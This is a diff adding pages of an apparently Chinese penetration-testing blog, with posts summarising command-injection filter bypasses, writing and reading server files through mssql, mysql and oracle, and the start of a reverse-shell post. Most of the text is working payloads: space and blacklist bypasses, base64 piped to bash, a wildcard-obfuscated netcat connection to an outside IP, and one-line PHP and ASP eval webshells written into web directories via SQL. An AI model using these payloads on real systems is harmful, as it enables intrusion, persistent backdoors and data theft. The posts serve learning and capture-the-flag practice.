@@ -258,6 +258,763 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/15/命令注入绕过方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/15/命令注入绕过方式总结/" itemprop="url">
+                  命令注入绕过方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-15T21:34:47+08:00">
+                2020-07-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/15/命令注入绕过方式总结/" class="leancloud_visitors" data-flag-title="命令注入绕过方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>命令注入是web中常见的漏洞之一，由于web应用程序未对用户提交的数据做严格的过滤，导致用户输入可以直接被linux或windows系统当成命令执行，一般都会造成严重的危害。</p>
+<h2 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h2><h4 id="分号（-）"><a href="#分号（-）" class="headerlink" title="分号（;）"></a>分号（;）</h4><p>多条语句顺序执行时的分割符号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd1;cmd2</span><br></pre></td></tr></table></figure></p>
+<h4 id="管道符（-）"><a href="#管道符（-）" class="headerlink" title="管道符（|）"></a>管道符（|）</h4><p>cmd1命令的输出，作为下一条命令cmd2的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd1|cmd2</span><br></pre></td></tr></table></figure></p>
+<h4 id="and（-amp-amp-）"><a href="#and（-amp-amp-）" class="headerlink" title="and（&amp;&amp;）"></a>and（&amp;&amp;）</h4><p>与命令，cmd1成功则执行cmd2，cmd1失败则不执行cmd2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd1 &amp;&amp; cmd2</span><br></pre></td></tr></table></figure></p>
+<h4 id="or（-）"><a href="#or（-）" class="headerlink" title="or（||）"></a>or（||）</h4><p>或命令，cmd1失败则执行cmd2，cmd1成功则不执行cmd2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd1 || cmd2</span><br></pre></td></tr></table></figure>
+<h4 id="反引号（）和"><a href="#反引号（）和" class="headerlink" title="反引号（）和$()"></a>反引号（<code></code>）和$()</h4><p>反引号和$()都可用来表示命令，被这两种方式包含的字符串都会被当做命令首先执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;result : `whoami`&quot;</span><br><span class="line">echo &quot;result : $(whoami)&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="绕过方式总结"><a href="#绕过方式总结" class="headerlink" title="绕过方式总结"></a>绕过方式总结</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>在过滤了空格的系统中，以cat flag.txt为例，系统不允许我们输入空格或输入后被过滤。</p>
+<h4 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h4><p>可使用${IFS}代替空格。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$1flag.txt</span><br><span class="line">cat$&#123;IFS&#125;$1flag.txt</span><br></pre></td></tr></table></figure>
+<h4 id="重定向符绕过-lt-gt"><a href="#重定向符绕过-lt-gt" class="headerlink" title="重定向符绕过(&lt;&gt;)"></a>重定向符绕过(&lt;&gt;)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br></pre></td></tr></table></figure>
+<h4 id="09-需要php环境"><a href="#09-需要php环境" class="headerlink" title="%09(需要php环境)"></a>%09(需要php环境)</h4><p>php环境下web输入%09等效于空格</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%09flag.txt</span><br></pre></td></tr></table></figure>
+<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><p>使用shell变量拼接被黑名单限制的关键词</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e;</span><br></pre></td></tr></table></figure>
+<h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>使用反引号包含base64解码后的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &quot;Y2F0IGZsYWcudHh0Cg==&quot; | base64 -d`</span><br></pre></td></tr></table></figure>
+<p>将base64解码后的命令通过管道符传递给bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWcudHh0Cg==&quot; | base64 -d | bash</span><br></pre></td></tr></table></figure></p>
+<h4 id="单引号，双引号"><a href="#单引号，双引号" class="headerlink" title="单引号，双引号"></a>单引号，双引号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at fl&apos;&apos;ag.tx&quot;&quot;t</span><br></pre></td></tr></table></figure>
+<h4 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\a\g.tx\t</span><br></pre></td></tr></table></figure>
+<h4 id="1"><a href="#1" class="headerlink" title="$1"></a>$1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca$1t fl$1ag.t$1xt</span><br></pre></td></tr></table></figure>
+<h3 id="读文件绕过"><a href="#读文件绕过" class="headerlink" title="读文件绕过"></a>读文件绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br></pre></td></tr></table></figure>
+<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>/???会去寻找 / 目录下的三个字符长度的文件，正常情况下会寻找到/bin，然后/?[a][t]会优先匹配到/bin/cat,就成功调用了cat命令，然后后面可以使用正常的通配符匹配所需读的文件，如flag.txt文件名长度为8，使用8个?’’，此命令就会读取所有长度为8的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/?[a][t] ?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>同理，我们也可以匹配/bin下的其他命令，如more，less，vi，tail等命令来查看文件，或者执行其他命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/[m][o]?[e] ?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/[t]?[i][l] ?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;?&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>甚至开启一个shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/[n]?[t]??[t] -lvp 4444</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/[n]?[t]??[t] 192.168.1.3 4444</span><br></pre></td></tr></table></figure>
+<h3 id="命令嵌套"><a href="#命令嵌套" class="headerlink" title="命令嵌套"></a>命令嵌套</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;result:`whoami`&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;result:$(uname -a)&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a>长度绕过</h3><h4 id="使用-gt-gt-绕过长度限制"><a href="#使用-gt-gt-绕过长度限制" class="headerlink" title="使用&gt;&gt;绕过长度限制"></a>使用&gt;&gt;绕过长度限制</h4><p>使用&gt;&gt;每次添加一部分命令到文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;cmd1&quot; &gt; r;</span><br><span class="line">echo -n &quot;cmd2&quot; &gt;&gt; r;</span><br><span class="line">echo -n &quot;cmd3&quot; &gt;&gt; r;</span><br><span class="line">echo &quot;cmd4&quot; &gt;&gt; r;</span><br></pre></td></tr></table></figure>
+<p>然后使用cat r | bash执行命令 </p>
+<h4 id="使用换行执行和ls-t绕过长度限制"><a href="#使用换行执行和ls-t绕过长度限制" class="headerlink" title="使用换行执行和ls -t绕过长度限制"></a>使用换行执行和ls -t绕过长度限制</h4><p>linux中，文件中的命令如果需要换行书写，需要在前一行末尾增加\，如文件a中有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ca\</span><br><span class="line">t flag.t\</span><br><span class="line">xt</span><br></pre></td></tr></table></figure></p>
+<p>使用sh a即可执行命令cat flag.txt</p>
+<p>ls -t可根据时间创建顺序逆序输出文件名</p>
+<blockquote>
+<p>a可以创建一个名为a的文件</p>
+</blockquote>
+<p>按照这个思路，可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; &quot;ag&quot;</span><br><span class="line">&gt; &quot;fl\\&quot;</span><br><span class="line">&gt; &quot;t \\&quot;</span><br><span class="line">&gt; &quot;ca\\&quot;</span><br></pre></td></tr></table></figure>
+<p>然后使用ls -t &gt; s</p>
+<p>s中文件内容就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s</span><br><span class="line">ca\</span><br><span class="line">t \</span><br><span class="line">fl\</span><br><span class="line">ag\</span><br><span class="line">其他的无关内容</span><br></pre></td></tr></table></figure></p>
+<p>之后使用sh s，即可执行cat flag</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/10/数据库写入文件方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/10/数据库写入文件方式总结/" itemprop="url">
+                  数据库写入文件方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-10T00:32:55+08:00">
+                2020-07-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/10/数据库写入文件方式总结/" class="leancloud_visitors" data-flag-title="数据库写入文件方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过数据库写入文件是由sql注入获取webshell的常见手段，本文讨论远程连接数据库场景下的文件写入，对常用的mssql、mysql、oracle三种数据库的写入方式做总结。</p>
+<h2 id="mssql数据库写入文件"><a href="#mssql数据库写入文件" class="headerlink" title="mssql数据库写入文件"></a>mssql数据库写入文件</h2><h3 id="调用xp-cmdshell调用windows命令echo写入文件"><a href="#调用xp-cmdshell调用windows命令echo写入文件" class="headerlink" title="调用xp_cmdshell调用windows命令echo写入文件"></a>调用xp_cmdshell调用windows命令echo写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.xp..cmdshell &apos;echo &quot;cmdshell&quot; &gt; xxx.php&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="使用backup方法写入文件"><a href="#使用backup方法写入文件" class="headerlink" title="使用backup方法写入文件"></a>使用backup方法写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use model;</span><br><span class="line">create table cmd(str image);</span><br><span class="line">insert into cmd(str) values (&apos;&lt;%eval request(&quot;cmd&quot;)%&gt;&apos;);</span><br><span class="line">backup database model to disk=&apos;c:\TEMP\1.asp&apos;;</span><br></pre></td></tr></table></figure>
+<h2 id="mysql数据库写入文件"><a href="#mysql数据库写入文件" class="headerlink" title="mysql数据库写入文件"></a>mysql数据库写入文件</h2><h3 id="使用select-into-outfile写入文件"><a href="#使用select-into-outfile写入文件" class="headerlink" title="使用select into outfile写入文件"></a>使用select into outfile写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php phpinfo(); ?&gt;&apos; into outfile &apos;c:/TEMP/outfile.php&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="使用select-into-dumpfile写入文件"><a href="#使用select-into-dumpfile写入文件" class="headerlink" title="使用select into dumpfile写入文件"></a>使用select into dumpfile写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;&lt;?php phpinfo(); ?&gt;&apos; into dumpfile &apos;c:/TEMP/dumpfile.php&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="使用mysql日志功能写入文件"><a href="#使用mysql日志功能写入文件" class="headerlink" title="使用mysql日志功能写入文件"></a>使用mysql日志功能写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general_log%&apos;;</span><br><span class="line">set global general_log_file=&quot;C://phpstudy_pro/WWW/sql_log.php&quot;;</span><br><span class="line">set global general_log=&quot;ON&quot;;</span><br><span class="line">SELECT &apos;&lt;?php @eval($_POST[&quot;123456&quot;]);?&gt;&apos;;</span><br></pre></td></tr></table></figure>
+<h2 id="oracle数据库写入文件"><a href="#oracle数据库写入文件" class="headerlink" title="oracle数据库写入文件"></a>oracle数据库写入文件</h2><h3 id="使用utl-file-方式写入文件"><a href="#使用utl-file-方式写入文件" class="headerlink" title="使用utl_file()方式写入文件"></a>使用utl_file()方式写入文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create or replace directory user_dir as &apos;C:\TEMP\oracle_dir&apos;;</span><br><span class="line">grant read on directory user_dir to public;</span><br><span class="line">grant write on directory user_dir to public;</span><br><span class="line">select * from dba_directories;</span><br><span class="line"></span><br><span class="line">declare</span><br><span class="line">F1 utl_file.file_type;</span><br><span class="line">begin</span><br><span class="line">F1:=utl_file.fopen(&apos;USER_DIR&apos;,&apos;01.txt&apos;,&apos;w&apos;);</span><br><span class="line">utl_file.put_line(F1,&apos;test&apos;);</span><br><span class="line">utl_file.fflush(F1);</span><br><span class="line">utl_file.fclose(F1);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/10/数据库读取文件方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/10/数据库读取文件方式总结/" itemprop="url">
+                  数据库读取文件方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-10T00:15:34+08:00">
+                2020-07-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/10/数据库读取文件方式总结/" class="leancloud_visitors" data-flag-title="数据库读取文件方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们找到一个sql注入漏洞时，首先能做的是将数据库的信息全部拖库，然后就会尝试使用数据库来获取更多的权限和资产，通过数据库读取服务器内文件是其中一种方式，本文仅讨论远程连接数据库场景下的文件读取，对常用的mssql、mysql、oracle三种数据库的读取方式做总结。</p>
+<h2 id="mssql数据库读取文件"><a href="#mssql数据库读取文件" class="headerlink" title="mssql数据库读取文件"></a>mssql数据库读取文件</h2><h3 id="调用xp-cmdshell调用windows命令type读取文件"><a href="#调用xp-cmdshell调用windows命令type读取文件" class="headerlink" title="调用xp_cmdshell调用windows命令type读取文件"></a>调用xp_cmdshell调用windows命令type读取文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.xp..cmdshell &apos;type c:\windows\system.ini&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="mysql数据库读取文件"><a href="#mysql数据库读取文件" class="headerlink" title="mysql数据库读取文件"></a>mysql数据库读取文件</h2><h3 id="使用load-file-方法读取文件"><a href="#使用load-file-方法读取文件" class="headerlink" title="使用load_file()方法读取文件"></a>使用load_file()方法读取文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:\windows\system.ini&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="使用load-file-infile-方法读取文件"><a href="#使用load-file-infile-方法读取文件" class="headerlink" title="使用load file infile()方法读取文件"></a>使用load file infile()方法读取文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table user(cmd text);</span><br><span class="line">load data infile &apos;c:/TEMP/text1.txt&apos; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure>
+<h2 id="oracle数据库读取文件"><a href="#oracle数据库读取文件" class="headerlink" title="oracle数据库读取文件"></a>oracle数据库读取文件</h2><h3 id="使用utl-file-方式读取文件"><a href="#使用utl-file-方式读取文件" class="headerlink" title="使用utl_file()方式读取文件"></a>使用utl_file()方式读取文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">create or replace directory user_dir as &apos;C:\TEMP\oracle_dir&apos;;</span><br><span class="line">grant read on directory user_dir to public;</span><br><span class="line">grant write on directory user_dir to public;</span><br><span class="line">select * from dba_directories;</span><br><span class="line"></span><br><span class="line">declare</span><br><span class="line">F1 utl_file.file_type;</span><br><span class="line">V1 varchar2(32767);</span><br><span class="line">begin</span><br><span class="line">F1:=utl_file.fopen(&apos;USER_DIR&apos;,&apos;02.txt&apos;,&apos;r&apos;);</span><br><span class="line">utl_file.get_line(F1,V1,30);</span><br><span class="line">utl_file.fclose(F1);</span><br><span class="line">dbms_output.put_line(V1);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/08/openssl加密反弹shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/07/08/openssl加密反弹shell/" itemprop="url">
+                  openssl加密反弹shell
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-08T19:54:10+08:00">
+                2020-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/08/openssl加密反弹shell/" class="leancloud_visitors" data-flag-title="openssl加密反弹shell">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
